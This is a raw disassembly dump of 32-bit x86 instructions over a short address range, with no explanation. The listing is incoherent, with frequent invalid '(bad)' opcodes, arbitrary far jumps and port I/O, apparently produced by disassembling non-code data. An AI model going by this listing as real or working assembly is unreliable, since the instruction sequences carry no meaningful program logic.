  41f255:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f256:	mov    ds:0x2b102d57,eax
  41f25b:	adc    eax,ebp
  41f25d:	jbe    0x41f2a9
  41f25f:	stos   BYTE PTR es:[edi],al
  41f260:	imul   edx,edx,0xffffff9b
  41f263:	xor    al,0x32
  41f265:	(bad)  
  41f267:	push   0xffffff9d
  41f269:	sub    DWORD PTR [ecx+0x6c],edx
  41f26c:	pushf  
  41f26d:	clc    
  41f26e:	jae    0x41f284
  41f270:	out    0x39,al
  41f272:	and    BYTE PTR [edi-0x19],cl
  41f275:	and    eax,0x6c393d90
  41f27a:	leave  
  41f27b:	mov    ah,0x13
  41f27d:	clc    
  41f27e:	push   ecx
  41f27f:	mov    bh,0x65
  41f281:	mov    dh,0xfa
  41f283:	pusha  
  41f284:	popf   
  41f285:	dec    ecx
  41f286:	xchg   ecx,eax
  41f287:	(bad)  
  41f288:	xchg   edi,eax
  41f289:	aaa    
  41f28a:	dec    edi
  41f28b:	enter  0x9af5,0x22
  41f28f:	add    dl,BYTE PTR [edx+0x0]
	...
  41f2f2:	add    BYTE PTR [eax],al
  41f2f4:	push   ecx
  41f2f5:	sbb    edi,edi
  41f2f7:	jmp    si
  41f2fa:	fnstcw WORD PTR [edi]
  41f2fc:	jo     0x41f2eb
  41f2fe:	sahf   
  41f2ff:	jb     0x41f319
  41f301:	outs   dx,BYTE PTR ds:[esi]
  41f302:	or     al,0x19
  41f304:	xor    al,0x4c
  41f306:	add    DWORD PTR [eax],eax
  41f308:	add    eax,0x53000001
  41f30d:	leave  
  41f30e:	push   edi
  41f30f:	addr16 ds in al,0xd4
  41f313:	(bad)  
  41f314:	pushf  
  41f315:	cwde   
  41f316:	add    al,0xde
  41f318:	(bad)  
  41f319:	push   esp
  41f31a:	into   
  41f31b:	jle    0x41f322
  41f31d:	sub    BYTE PTR [edi],dl
  41f31f:	test   eax,0xe82fc456
  41f324:	ins    BYTE PTR es:[edi],dx
  41f325:	hlt    
  41f326:	out    0x23,eax
  41f328:	(bad)  
  41f32b:	ror    al,cl
  41f32d:	fist   WORD PTR [ecx-0x3a]
  41f330:	jno    0x41f2c7
  41f332:	cdq    
  41f333:	pcmpgtb mm3,mm2
  41f336:	push   edi
  41f337:	inc    edx
  41f338:	in     al,0xb8
  41f33a:	inc    ebp
  41f33b:	stos   BYTE PTR es:[edi],al
  41f33c:	fld    QWORD PTR [esi-0x66]
  41f33f:	xchg   edi,eax
  41f340:	popa   
  41f341:	pop    ds
  41f342:	sub    esp,DWORD PTR [eax-0x21]
  41f345:	leave  
  41f346:	add    edx,DWORD PTR [edi]
  41f348:	fst    QWORD PTR [ebx]
  41f34a:	ss hlt 
  41f34c:	cwde   
  41f34d:	mov    ah,0xac
  41f34f:	jns    0x41f30d
  41f351:	xor    eax,0xb06093e3
  41f356:	sbb    al,0x33
  41f358:	push   edx
  41f359:	ret    
  41f35a:	cs sub ebp,ebx
  41f35d:	out    dx,eax
  41f35e:	xchg   esi,eax
  41f35f:	sti    
  41f360:	add    DWORD PTR [eax+0x1c],0xffffffcb
  41f364:	ret    0x87f9
  41f367:	push   ecx
  41f368:	leave  
  41f369:	inc    edx
  41f36a:	push   0x6f
  41f36c:	stos   DWORD PTR es:[edi],eax
  41f36d:	xor    eax,0xa69b3b6f
  41f372:	add    eax,ecx
  41f374:	sti    
  41f375:	and    al,0xda
  41f377:	xchg   ebp,eax
  41f378:	inc    ebp
  41f379:	jno    0x41f377
  41f37b:	inc    edi
  41f37c:	mov    ds:0x8f20cbcd,al
  41f381:	cmp    BYTE PTR ds:0x9b4580b4,al
  41f387:	ret    
  41f388:	xor    al,0xd4
  41f38a:	std    
  41f38b:	arpl   WORD PTR [edx+edi*2],di
  41f38e:	ret    
  41f38f:	pushf  
  41f390:	jmp    0x41f3e9
  41f392:	sti    
  41f393:	enter  0x3f62,0x79
  41f397:	add    al,0xe5
  41f399:	cwde   
  41f39a:	cmp    ebp,eax
  41f39c:	inc    ebx
  41f39d:	and    dh,BYTE PTR [edx+0x3bc0f8d4]
  41f3a3:	mov    BYTE PTR [edi+0x53],al
  41f3a6:	jmp    0xf552:0x9d677fdc
  41f3ad:	xchg   ecx,eax
  41f3ae:	dec    ebp
  41f3af:	push   edx
  41f3b0:	push   esi
  41f3b1:	in     eax,dx
  41f3b2:	stos   BYTE PTR es:[edi],al
  41f3b3:	jecxz  0x41f3bc
  41f3b5:	repz pushf 
  41f3b7:	cmp    BYTE PTR [ebx+edi*8+0x595ce595],bl
  41f3be:	dec    edx
  41f3bf:	mov    gs,WORD PTR [eax+0x747f72a7]
  41f3c5:	(bad)  
  41f3c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3c7:	loope  0x41f39e
  41f3c9:	dec    ecx
  41f3ca:	cli    
  41f3cb:	sbb    BYTE PTR [esi+0x564c26a8],ch
  41f3d1:	xor    al,0xdb
  41f3d3:	sub    eax,DWORD PTR [ebp+0x5]
  41f3d6:	in     eax,0xe5
  41f3d8:	enter  0x1941,0xbf
  41f3dc:	add    cl,BYTE PTR [esi+0x6b]
  41f3df:	pminsw mm2,QWORD PTR [eax+esi*2+0x1b]
  41f3e4:	ficomp WORD PTR [esi]
  41f3e6:	sbb    edx,ebx
  41f3e8:	mov    al,0x38
  41f3ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3eb:	xchg   esi,eax
  41f3ec:	arpl   dx,ax
  41f3ee:	cli    
  41f3ef:	fcom   QWORD PTR [ecx+0x64]
  41f3f2:	out    0x24,al
  41f3f4:	dec    esi
  41f3f5:	sbb    DWORD PTR [ebp+0x728e48d7],eax
  41f3fb:	adc    al,0xc0
  41f3fd:	xchg   BYTE PTR [esi],dl
  41f3ff:	aas    
  41f400:	int3   
  41f401:	gs push ebp
  41f403:	fucom  st(5)
  41f405:	and    eax,DWORD PTR [edi]
  41f407:	leave  
  41f408:	mov    esp,0x6ed5041e
  41f40d:	jno    0x41f3cd
  41f40f:	test   BYTE PTR [edi+0x0],al
	...
  41f472:	add    BYTE PTR [eax],al
  41f474:	cmp    al,0xe7
  41f476:	imul   ebp,edi,0xfffffffb
  41f479:	out    dx,eax
  41f47a:	mov    esp,0xd5fd13f7
  41f47f:	mov    ch,0x4e
  41f481:	adc    eax,0x4d39b9b1
  41f486:	add    DWORD PTR [eax],eax
  41f488:	add    eax,0xcf000001
  41f48d:	nop
  41f48e:	out    dx,al
  41f48f:	jnp    0x41f4e4
  41f491:	add    dl,BYTE PTR [edx-0x6a]
  41f494:	mov    cl,0x17
  41f496:	cmp    BYTE PTR [ecx],al
  41f498:	ins    BYTE PTR es:[edi],dx
  41f499:	jp     0x41f455
  41f49b:	push   0x1d
  41f49d:	push   ebx
  41f49e:	pop    ecx
  41f49f:	lods   al,BYTE PTR ds:[esi]
  41f4a0:	mov    esi,0x3d54e01f
  41f4a5:	pop    ebp
  41f4a6:	jmp    0xa29c:0x511a3a45
  41f4ad:	je     0x41f469
  41f4af:	fwait
  41f4b0:	pusha  
  41f4b1:	iret   
  41f4b2:	sahf   
  41f4b3:	jge    0x41f4ce
  41f4b5:	in     eax,dx
  41f4b6:	or     al,0xca
  41f4b8:	sub    DWORD PTR ds:0x4c550e58,ebp
  41f4be:	(bad)  
  41f4bf:	cld    
  41f4c0:	inc    eax
  41f4c1:	xchg   ebx,eax
  41f4c2:	cwde   
  41f4c3:	inc    edx
  41f4c4:	inc    ebp
  41f4c5:	fnsetpm(287 only) 
  41f4c7:	or     DWORD PTR [esi+ebx*2+0x3480d197],esi
  41f4ce:	test   al,0x90
  41f4d0:	jne    0x41f4dd
  41f4d2:	cli    
  41f4d3:	(bad)  
  41f4d4:	pop    ecx
  41f4d5:	xchg   esi,eax
  41f4d6:	xchg   ebp,eax
  41f4d7:	pop    ds
  41f4d8:	pusha  
  41f4d9:	and    bh,dl
  41f4db:	inc    esi
  41f4dc:	out    dx,al
  41f4dd:	and    bl,bh
  41f4df:	sbb    DWORD PTR [ecx-0x33],esi
  41f4e2:	jecxz  0x41f4b5
  41f4e4:	and    esi,edi
  41f4e6:	xlat   BYTE PTR ds:[ebx]
  41f4e7:	jmp    0x9f76:0x94473b6
  41f4ee:	dec    esp
  41f4ef:	add    al,0x92
  41f4f1:	pop    esi
  41f4f2:	in     al,dx
  41f4f3:	fldcw  WORD PTR [eax+0x40aac439]
  41f4f9:	or     bh,BYTE PTR [ebp-0x62]
  41f4fc:	jnp    0x41f50c
  41f4fe:	(bad)  
  41f500:	daa    
  41f501:	push   0x6eeba5e8
  41f506:	mov    bl,0x5f
  41f508:	sub    esi,0x40
  41f50b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f50c:	dec    edx
  41f50d:	inc    edi
  41f50e:	pusha  
  41f50f:	aam    0x31
  41f511:	mov    edx,0x76712dd8
  41f516:	mov    bl,BYTE PTR [esp+edi*4]
  41f519:	or     bl,BYTE PTR [edi]
  41f51b:	clc    
  41f51c:	xor    eax,0xbe2f8f75
  41f521:	imul   ebp,DWORD PTR [ebp-0x43],0x82673364
  41f528:	sub    eax,eax
  41f52a:	pop    ebx
  41f52b:	fnsave [eax]
  41f52d:	inc    ebp
  41f52e:	retf   
  41f52f:	xchg   edi,eax
  41f530:	in     al,dx
  41f531:	xchg   DWORD PTR [eax+0x7e11a1c4],esp
  41f537:	mov    al,ds:0x249fcd0b
  41f53c:	sub    BYTE PTR [ebp-0x32],cl
  41f53f:	(bad)  [ebx+0x4e]
  41f542:	cmc    
  41f543:	sbb    edi,DWORD PTR [esi]
  41f545:	mov    ecx,0xbca6f6c4
  41f54a:	add    BYTE PTR [ecx-0x63db1091],al
  41f550:	es js  0x41f59c
  41f553:	fld    TBYTE PTR [ecx]
  41f555:	imul   edi,DWORD PTR [ecx+0x49],0xb1e08c9d
  41f55c:	mov    ebx,?
  41f55e:	mov    ds:0x3ee84c9b,eax
  41f563:	outs   dx,DWORD PTR ds:[esi]
  41f564:	jmp    0x41f525
  41f566:	test   dh,al
  41f568:	dec    ebx
  41f569:	push   ebx
  41f56a:	add    esp,DWORD PTR [ebx]
  41f56c:	jg     0x41f4f7
  41f56e:	or     al,0x27
  41f570:	xchg   edi,eax
  41f571:	add    BYTE PTR [ebx-0x7fab435f],ch
  41f577:	stc    
  41f578:	xchg   BYTE PTR [esi+0x69728ca6],bh
  41f57e:	cs cs push ebx
  41f581:	hlt    
  41f582:	jbe    0x41f566
  41f584:	icebp  
  41f585:	jno    0x41f5dd
  41f587:	add    ch,BYTE PTR [edx-0x459bc94b]
  41f58d:	mov    ch,dl
  41f58f:	add    DWORD PTR [ebx+0x0],ebp
	...
  41f5f2:	add    BYTE PTR [eax],al
  41f5f4:	js     0x41f62a
  41f5f6:	add    bh,bl
  41f5f8:	dec    esi
  41f5f9:	(bad)  
  41f5fa:	stc    
  41f5fb:	mov    bh,0xb7
  41f5fd:	jmp    0xae84:0x4fded422
  41f604:	ds dec esi
  41f606:	add    DWORD PTR [eax],eax
  41f608:	add    eax,0x24000001
  41f60d:	cs push eax
  41f60f:	adc    al,0xf8
  41f611:	cmp    bl,cl
  41f613:	inc    eax
  41f614:	rcr    ecx,0x7
  41f617:	test   eax,0xd085857b
  41f61c:	and    eax,0xc7625435
  41f621:	neg    DWORD PTR [eax+0x3221132b]
  41f627:	mov    WORD PTR [esi],es
  41f629:	xlat   BYTE PTR ds:[ebx]
  41f62a:	fidivr DWORD PTR [edx+ebx*2-0x59bc14f2]
  41f631:	rdtsc  
  41f633:	fisub  WORD PTR [edx]
  41f635:	test   eax,0x7d6a9b70
  41f63a:	push   edx
  41f63b:	out    dx,al
  41f63c:	xchg   ecx,eax
  41f63d:	ret    
  41f63e:	dec    esp
  41f63f:	dec    ecx
  41f640:	(bad)  
  41f641:	lock mov esp,0x6ec7fc02
  41f647:	out    0xc9,al
  41f649:	add    BYTE PTR [ebx+ebp*1],bl
  41f64c:	jmp    DWORD PTR ds:0xca9881a9
  41f652:	dec    ebx
  41f653:	mov    ds:0xe332d7d6,eax
  41f658:	add    eax,0xd3729a55
  41f65d:	mov    edi,0x870a0345
  41f662:	mov    dl,0xf9
  41f664:	stos   DWORD PTR es:[edi],eax
  41f665:	jmp    0xcfea:0x30e40243
  41f66c:	xchg   esi,eax
  41f66d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f66e:	fdiv   DWORD PTR [edi]
  41f670:	sub    BYTE PTR [ecx-0x21],bl
  41f673:	mov    ecx,0xc6cdb777
  41f678:	dec    edi
  41f679:	mov    edx,0xebc2de97
  41f67e:	std    
  41f67f:	test   DWORD PTR [ebx],0xb0c829bf
  41f685:	mov    ds:0xfe56576e,eax
  41f68a:	sub    eax,0x7486c34c
  41f68f:	(bad)  
  41f690:	in     eax,dx
  41f691:	lds    edi,FWORD PTR [edi+0x31]
  41f694:	pop    es
  41f695:	sbb    ah,BYTE PTR [ebx-0x2f]
  41f698:	inc    edi
  41f699:	push   esp
  41f69a:	xor    eax,0xe838a667
  41f69f:	cmp    BYTE PTR [eax],al
  41f6a1:	dec    edx
  41f6a2:	cwde   
  41f6a3:	clc    
  41f6a4:	adc    edi,DWORD PTR cs:[ebx]
  41f6a7:	inc    edx
  41f6a8:	jle    0x41f686
  41f6aa:	dec    ebp
  41f6ab:	inc    esi
  41f6ac:	lods   al,BYTE PTR ds:[esi]
  41f6ad:	shl    dl,1
  41f6af:	mov    edi,edx
  41f6b1:	out    0x6,al
  41f6b3:	jbe    0x41f6ee
  41f6b5:	mov    eax,0x7e3cd09f
  41f6ba:	xchg   dh,bl
  41f6bc:	je     0x41f681
  41f6be:	outs   dx,DWORD PTR ds:[esi]
  41f6bf:	sbb    BYTE PTR [esi+0x3e],dl
  41f6c2:	(bad)  
  41f6c3:	mov    ecx,DWORD PTR [edi+0x535a429d]
  41f6c9:	mov    edi,0x92f8ca50
  41f6ce:	push   0x66
  41f6d0:	gs jmp 0xe3d025e1
  41f6d6:	jne    0x41f6da
  41f6d8:	retf   0xd5c9
  41f6db:	push   ecx
  41f6dc:	pop    edx
  41f6dd:	and    edi,edx
  41f6df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6e0:	pusha  
  41f6e1:	jmp    0x3777:0x32178417
  41f6e8:	out    0xad,eax
  41f6ea:	fistp  WORD PTR [edi-0x566b3968]
  41f6f0:	adc    al,0x8a
  41f6f2:	inc    ebp
  41f6f3:	xor    DWORD PTR [ecx-0x2b5dd422],ecx
  41f6f9:	adc    BYTE PTR [ecx],bh
  41f6fb:	gs mov ecx,0xe8b051d4
  41f701:	rcr    BYTE PTR [eax+0xe],cl
  41f704:	mov    esp,0x3d30e0e
  41f709:	in     al,0xdc
  41f70b:	push   esp
  41f70c:	iret   
  41f70d:	pop    ebp
  41f70e:	outs   dx,DWORD PTR ds:[esi]
  41f70f:	cmc    
  41f710:	jo     0x41f712
	...
  41f772:	add    BYTE PTR [eax],al
  41f774:	xchg   edx,eax
  41f775:	cmp    al,0x23
  41f777:	jle    0x41f728
  41f779:	jg     0x41f75a
  41f77b:	cld    
  41f77c:	call   0x2f4e:0xcd6c62d2
  41f783:	xor    al,BYTE PTR [ebx+0x4f]
  41f786:	add    DWORD PTR [eax],eax
  41f788:	add    eax,0x2000001
  41f78d:	int3   
  41f78e:	mul    BYTE PTR [edi+0x6e052bc4]
  41f794:	xchg   ecx,eax
  41f795:	int    0x7b
  41f797:	or     esp,DWORD PTR [eax]
  41f799:	fbstp  TBYTE PTR [eax]
  41f79b:	mov    ah,0x46
  41f79d:	push   ebx
  41f79e:	xor    ecx,DWORD PTR [edi-0x72]
  41f7a1:	in     eax,0x20
  41f7a3:	in     eax,dx
  41f7a4:	popa   
  41f7a5:	cmp    bh,BYTE PTR [ebp+edi*2-0x66952d73]
  41f7ac:	sbb    bl,BYTE PTR [ebp-0x1c]
  41f7af:	pop    ds
  41f7b0:	add    eax,0xb75fb8f2
  41f7b5:	daa    
  41f7b6:	popf   
  41f7b7:	addr16 mov dl,0x69
  41f7ba:	pop    ds
  41f7bb:	es imul edx,eax,0xfffffff1
  41f7bf:	test   BYTE PTR [edx+0x38820887],0xa0
  41f7c6:	sub    al,0xb7
  41f7c8:	repnz pop ebp
  41f7ca:	sbb    ebp,DWORD PTR [esi]
  41f7cc:	sub    ecx,eax
  41f7ce:	inc    eax
  41f7cf:	sbb    DWORD PTR [edi-0x19],esi
  41f7d2:	sub    al,0xb6
  41f7d4:	or     al,0x26
  41f7d6:	xchg   edi,eax
  41f7d7:	hlt    
  41f7d8:	outs   dx,BYTE PTR ds:[esi]
  41f7d9:	mov    edi,0xec7d448e
  41f7de:	mov    dh,0xcf
  41f7e0:	and    cl,BYTE PTR [ebx+edi*1]
  41f7e3:	add    DWORD PTR [ecx+0x5765a86e],ecx
  41f7e9:	cmp    al,0x78
  41f7eb:	jmp    0x41f7a1
  41f7ed:	dec    eax
  41f7ee:	nop
  41f7ef:	int    0xa8
  41f7f1:	pop    ebx
  41f7f2:	shr    DWORD PTR [edi-0x54],1
  41f7f5:	and    BYTE PTR [edx+0x6],dh
  41f7f8:	shl    eax,1
  41f7fa:	cmc    
  41f7fb:	xchg   ebx,eax
  41f7fc:	mov    esp,esp
  41f7fe:	retf   
  41f7ff:	imul   ebp,DWORD PTR [ecx-0x51],0x7a
  41f803:	adc    BYTE PTR [ecx-0xbc32b2c],bl
  41f809:	rcl    DWORD PTR [esi+0x385d8a28],0x99
  41f810:	inc    edi
  41f811:	fistp  DWORD PTR [ecx-0x45]
  41f814:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f815:	(bad)  
  41f816:	out    0xec,al
  41f818:	rcr    BYTE PTR [ecx-0x1f],cl
  41f81b:	or     DWORD PTR [esi+esi*4+0x3d],esi
  41f81f:	sub    edx,ecx
  41f821:	sub    DWORD PTR [ebp*2+0x3153bcc2],edx
  41f828:	mov    bl,0xce
  41f82a:	jo     0x41f895
  41f82c:	sbb    al,BYTE PTR [ebx]
  41f82e:	adc    edx,ebx
  41f830:	mov    ?,eax
  41f832:	push   cs
  41f833:	pop    eax
  41f834:	add    al,BYTE PTR [esi]
  41f836:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f837:	and    esi,DWORD PTR [ecx]
  41f839:	mov    bl,0xbc
  41f83b:	out    dx,eax
  41f83c:	loopne 0x41f868
  41f83e:	ja     0x41f7ed
  41f840:	(bad)  
  41f841:	call   0xa3bcd0db
  41f846:	inc    ecx
  41f847:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f848:	inc    BYTE PTR [esi]
  41f84a:	ds mov eax,0xc6a0afc8
  41f850:	or     ch,dl
  41f852:	popf   
  41f853:	sub    DWORD PTR [ecx+edx*4],ecx
  41f856:	xchg   edx,eax
  41f857:	icebp  
  41f858:	test   DWORD PTR [esi-0x2f],edx
  41f85b:	jne    0x41f86c
  41f85d:	dec    esp
  41f85e:	aam    0xcd
  41f860:	pop    ebp
  41f861:	std    
  41f862:	jmp    0x8fc61430
  41f867:	xchg   esp,eax
  41f868:	mov    dl,0x7a
  41f86a:	icebp  
  41f86b:	push   edx
  41f86c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f86d:	nop
  41f86e:	mov    esi,0xfc499135
  41f873:	repz (bad) 
  41f875:	fwait
  41f876:	adc    edx,edi
  41f878:	xchg   ecx,eax
  41f879:	pmulhw mm6,QWORD PTR [edi]
  41f87c:	adc    dl,cl
  41f87e:	js     0x41f842
  41f880:	adc    DWORD PTR [edx-0x1d69637e],ecx
  41f886:	push   esp
  41f887:	mov    esp,DWORD PTR [ebx-0x3f]
  41f88a:	shl    DWORD PTR [ebp+0x393f5807],1
  41f890:	cld    
	...
  41f8f1:	add    BYTE PTR [eax],al
  41f8f3:	add    BYTE PTR [ecx+0x3b920b9a],ah
  41f8f9:	xchg   ebx,eax
  41f8fa:	mov    ecx,0x4183febb
  41f8ff:	pop    edx
  41f900:	mov    ebx,esp
  41f902:	ret    0x4889
  41f905:	push   eax
  41f906:	add    DWORD PTR [eax],eax
  41f908:	add    eax,0xfb000001
  41f90d:	or     al,cl
  41f90f:	nop
  41f910:	mov    al,0x7b
  41f912:	lahf   
  41f913:	mov    esp,0xbb3fab8b
  41f918:	shr    ebx,1
  41f91a:	push   eax
  41f91b:	outs   dx,BYTE PTR ds:[esi]
  41f91c:	add    eax,0xf9035155
  41f921:	sbb    DWORD PTR [edx-0x52],ebx
  41f924:	sbb    al,0x14
  41f926:	cmp    ebp,eax
  41f928:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f929:	xlat   BYTE PTR ds:[ebx]
  41f92a:	push   esi
  41f92b:	(bad)  
  41f92c:	call   0x8c6edbe1
  41f931:	inc    edi
  41f932:	aas    
  41f933:	stos   DWORD PTR es:[edi],eax
  41f934:	jmp    0x37eb:0x5063e437
  41f93b:	jecxz  0x41f959
  41f93d:	xor    DWORD PTR [eax-0x1b],edi
  41f940:	out    0x5b,al
  41f942:	mov    edi,0xded8295b
  41f947:	retf   
  41f948:	dec    ebx
  41f949:	dec    esp
  41f94a:	jbe    0x41f930
  41f94c:	ficomp WORD PTR [ecx+0x7976d0dd]
  41f952:	mov    dl,BYTE PTR [edi]
  41f954:	dec    esp
  41f955:	push   ss
  41f956:	ret    
  41f957:	sbb    DWORD PTR [ecx],esi
  41f959:	inc    ebp
  41f95a:	sbb    edx,ebx
  41f95c:	int3   
  41f95d:	pushf  
  41f95e:	(bad)  
  41f95f:	mov    esp,0x8203071
  41f964:	mov    dl,0x29
  41f966:	jnp    0x41f99a
  41f968:	mul    ebx
  41f96a:	sub    dx,WORD PTR ds:0xfeb3a001
  41f971:	fcom   QWORD PTR [edx]
  41f973:	(bad)  
  41f974:	addr16 pop ebx
  41f976:	jnp    0x41f9f6
  41f978:	xor    ecx,eax
  41f97a:	xor    eax,0x6f7ac39b
  41f97f:	jle    0x41f933
  41f981:	dec    esp
  41f982:	jp     0x41f9ce
  41f984:	and    bh,0x82
  41f987:	fs mov edx,0xf1032357
  41f98d:	stc    
  41f98e:	(bad)  
  41f98f:	jns    0x41f91f
  41f991:	daa    
  41f992:	push   ebx
  41f993:	mov    edi,es
  41f995:	xor    eax,0xf6e88216
  41f99a:	cli    
  41f99b:	xor    al,0x6c
  41f99d:	mov    ebp,DWORD PTR [eax+esi*4+0x40]
  41f9a1:	sbb    bh,bl
  41f9a3:	into   
  41f9a4:	fstp   QWORD PTR [eax]
  41f9a6:	dec    ebp
  41f9a7:	call   DWORD PTR [eax-0x3acb9116]
  41f9ad:	and    BYTE PTR [ebp-0x4d],ah
  41f9b0:	vpaddd xmm6,xmm4,xmm6
  41f9b4:	(bad)  cs:[ebx-0x13]
  41f9b8:	push   eax
  41f9b9:	jmp    0x9833866a
  41f9be:	mov    gs,ebx
  41f9c0:	std    
  41f9c1:	xlat   BYTE PTR ds:[ebx]
  41f9c2:	inc    ebp
  41f9c3:	clc    
  41f9c4:	dec    ebx
  41f9c5:	dec    edi
  41f9c6:	sbb    ch,BYTE PTR [ebx]
  41f9c8:	mov    edi,0x9e91849d
  41f9cd:	hlt    
  41f9ce:	stc    
  41f9cf:	cmp    al,0xbc
  41f9d1:	jne    0x41f9cc
  41f9d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9d4:	or     edx,eax
  41f9d6:	pop    edx
  41f9d7:	ins    BYTE PTR es:[edi],dx
  41f9d8:	jns    0x41fa17
  41f9da:	jle    0x41f9c4
  41f9dc:	sub    edx,DWORD PTR [esi]
  41f9de:	and    DWORD PTR [ecx],edi
  41f9e0:	add    bh,ah
  41f9e2:	add    al,0xaa
  41f9e4:	pop    eax
  41f9e5:	inc    edi
  41f9e6:	sbb    dl,BYTE PTR [edx+0x156fe61b]
  41f9ec:	lock mov al,ds:0x77789b37
  41f9f2:	ds push ds
  41f9f4:	out    0xe9,al
  41f9f6:	fistp  QWORD PTR [ecx+0x7f4e572b]
  41f9fc:	(bad)  
  41f9fd:	cmp    al,0xfe
  41f9ff:	jg     0x41f984
  41fa01:	sbb    eax,0x44f6f70b
  41fa06:	int3   
  41fa07:	stos   DWORD PTR es:[edi],eax
  41fa08:	lea    edi,[edi]
  41fa0a:	sbb    esi,DWORD PTR [edi]
  41fa0c:	mov    eax,ds:0xaef7a6ad
	...
  41fa71:	add    BYTE PTR [eax],al
  41fa73:	add    BYTE PTR [edx],cl
  41fa75:	inc    ecx
  41fa76:	mov    bh,0xa1
  41fa78:	push   edi
  41fa7a:	push   ds
  41fa7b:	jmp    0x41faa0
  41fa7d:	push   edi
  41fa7e:	mov    ds:0xa6a96615,eax
  41fa83:	inc    esp
  41fa84:	dec    ebp
  41fa85:	push   ecx
  41fa86:	add    DWORD PTR [eax],eax
  41fa88:	add    eax,0x26000001
  41fa8d:	mov    ebx,ecx
  41fa8f:	das    
  41fa90:	mov    al,ds:0x9b693748
  41fa95:	mov    eax,ds:0x90803b6f
  41fa9a:	std    
  41fa9b:	xchg   ebp,eax
  41fa9c:	mov    eax,0xcf9cde8c
  41faa1:	mov    ecx,0x4be24f9c
  41faa6:	push   eax
  41faa7:	rcl    DWORD PTR [edi+0x4f],cl
  41faaa:	jmp    0x60871839
  41faaf:	or     DWORD PTR [esi],ebp
  41fab1:	lahf   
  41fab2:	leave  
  41fab3:	pop    esp
  41fab4:	mov    ds:0x754f6962,al
  41fab9:	mov    dh,0xb1
  41fabb:	enter  0x3044,0xad
  41fabf:	mov    dh,0xb
  41fac1:	(bad)  
  41fac2:	dec    eax
  41fac3:	fmul   st,st(6)
  41fac5:	mov    ah,0x58
  41fac7:	push   eax
  41fac8:	pop    edi
  41fac9:	mov    dh,0x9f
  41facb:	xchg   ecx,eax
  41facc:	je     0x41fb01
  41face:	(bad)  
  41facf:	rcl    DWORD PTR [ebx+0x230dd257],cl
  41fad5:	xlat   BYTE PTR ds:[ebx]
  41fad6:	popa   
  41fad7:	and    edx,edi
  41fad9:	nop
  41fada:	or     ebx,DWORD PTR [ebx-0x1f]
  41fadd:	mov    al,0x6
  41fadf:	mov    ch,0xdc
  41fae1:	call   0x5b869d58
  41fae6:	xchg   esp,eax
  41fae7:	xor    al,0xfa
  41fae9:	xchg   ebp,eax
  41faea:	pop    edx
  41faeb:	push   ebx
  41faec:	stos   BYTE PTR es:[edi],al
  41faed:	fs jb  0x41fb63
  41faf0:	call   0xf39:0xc2eee03a
  41faf7:	and    ebp,ecx
  41faf9:	sub    ch,BYTE PTR [eax]
  41fafb:	popa   
  41fafc:	cwde   
  41fafd:	les    esi,FWORD PTR [esi]
  41faff:	dec    ebp
  41fb00:	daa    
  41fb01:	add    esi,ebp
  41fb03:	arpl   WORD PTR [ecx],bp
  41fb05:	xor    edi,DWORD PTR [edi-0x45]
  41fb08:	(bad)  
  41fb09:	mov    bh,BYTE PTR [edi+0x27]
  41fb0c:	sbb    DWORD PTR [edi+0x44],ecx
  41fb0f:	xor    edx,ebx
  41fb11:	int    0xd4
  41fb13:	or     dl,BYTE PTR [edx-0x23]
  41fb16:	xchg   BYTE PTR [edi+0x57],ch
  41fb19:	dec    edi
  41fb1a:	cmp    ecx,DWORD PTR [edx-0x13378f4b]
  41fb20:	ds push ss
  41fb22:	xor    esp,esp
  41fb24:	stos   BYTE PTR es:[edi],al
  41fb25:	jg     0x41fb1c
  41fb27:	lods   eax,DWORD PTR ds:[esi]
  41fb28:	out    dx,al
  41fb29:	popa   
  41fb2a:	addr16 push esp
  41fb2c:	int    0x83
  41fb2e:	outs   dx,BYTE PTR ds:[esi]
  41fb2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb30:	pop    edx
  41fb31:	icebp  
  41fb32:	mov    ecx,0x9369754d
  41fb37:	xlat   BYTE PTR ds:[ebx]
  41fb38:	lock mov esi,0x4a2c61ee
  41fb3e:	adc    dl,BYTE PTR [edi-0x5244aaca]
  41fb44:	sub    cl,al
  41fb46:	jne    0x41fb11
  41fb48:	and    al,0x1d
  41fb4a:	sbb    al,0x5d
  41fb4c:	cli    
  41fb4d:	in     al,dx
  41fb4e:	mov    edi,0xb6abe141
  41fb53:	in     eax,dx
  41fb54:	dec    ebp
  41fb55:	addr16 pop es
  41fb57:	push   edi
  41fb58:	xor    al,0x22
  41fb5a:	jp     0x41faea
  41fb5c:	jno    0x41fba1
  41fb5e:	jns    0x41fbbb
  41fb60:	mov    ds:0x1a850f6c,eax
  41fb65:	dec    ebp
  41fb66:	scas   al,BYTE PTR es:[edi]
  41fb67:	and    cl,BYTE PTR [eax+edx*1]
  41fb6a:	int    0xd1
  41fb6c:	sbb    BYTE PTR [ebx+0x77bf1201],cl
  41fb72:	or     al,0xb7
  41fb74:	stos   BYTE PTR es:[edi],al
  41fb75:	test   al,0x4b
  41fb77:	std    
  41fb78:	cdq    
  41fb79:	inc    DWORD PTR [ebp-0x3a6575c8]
  41fb7f:	inc    ebx
  41fb80:	(bad)  
  41fb81:	add    al,0x25
  41fb83:	sub    al,0xdb
  41fb85:	jmp    0x41fbc5
  41fb87:	jmp    0x92c3:0xedcb14ea
  41fb8e:	mov    WORD PTR [ecx],gs
  41fb90:	sbb    eax,0x0
	...
  41fbf1:	add    BYTE PTR [eax],al
  41fbf3:	add    ah,bl
  41fbf5:	sub    BYTE PTR [edx-0x119011c],cl
  41fbfb:	cmp    BYTE PTR [esi],ah
  41fbfd:	ret    
  41fbfe:	or     DWORD PTR [esi],edx
  41fc00:	inc    ebp
  41fc01:	push   ecx
  41fc02:	push   ebx
  41fc03:	push   ecx
  41fc04:	push   edx
  41fc05:	push   edx
  41fc06:	add    DWORD PTR [eax],eax
